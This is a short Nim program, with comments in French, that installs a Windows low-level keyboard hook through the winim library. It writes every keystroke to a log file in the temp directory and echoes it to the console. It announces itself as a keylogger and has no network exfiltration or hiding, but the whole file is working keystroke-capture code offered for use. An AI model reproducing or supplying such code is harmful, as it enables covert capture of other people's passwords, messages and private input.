import winim, strutils, os

let logFile = getTempDir() & "keylog_" & $getCurrentProcessId() & ".txt"

# Nettoie l'ancien fichier
if fileExists(logFile):
  removeFile(logFile)

let hook = SetWindowsHookEx(WH_KEYBOARD_LL, 
  proc(nCode: cint, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall.} =
    if nCode >= 0 and wParam == WM_KEYDOWN:
      let kbdStruct = cast[PKBDLLHOOKSTRUCT](lParam)
      
      # Convertir le code touche en caractère
      var keyboardState: array[256, BYTE]
      GetKeyboardState(addr keyboardState[0])
      
      var asciiChar: WORD = 0
      if ToAscii(kbdStruct.vkCode, kbdStruct.scanCode, 
                addr keyboardState[0], addr asciiChar, 0) > 0:
        let char = chr(asciiChar and 0xFF)
        
        # Écriture dans le fichier
        var f = open(logFile, fmAppend)
        f.write(char)
        f.close()
        
        # Aussi afficher pour debug
        stdout.write(char)
        flushFile(stdout)
        
    return CallNextHookEx(0.HHOOK, nCode, wParam, lParam), 
  GetModuleHandle(nil), 0)

if hook == 0.HHOOK:
    echo "Failed to install hook."
    quit(1)

echo "Keylogger started. Log file: ", logFile
echo "Press Ctrl+C to exit."

var msg: MSG
while GetMessage(addr msg, 0.HWND, 0, 0):
    TranslateMessage(addr msg)
    DispatchMessage(addr msg)

UnhookWindowsHookEx(hook)
echo "\nKeylogger stopped. Log saved to: ", logFile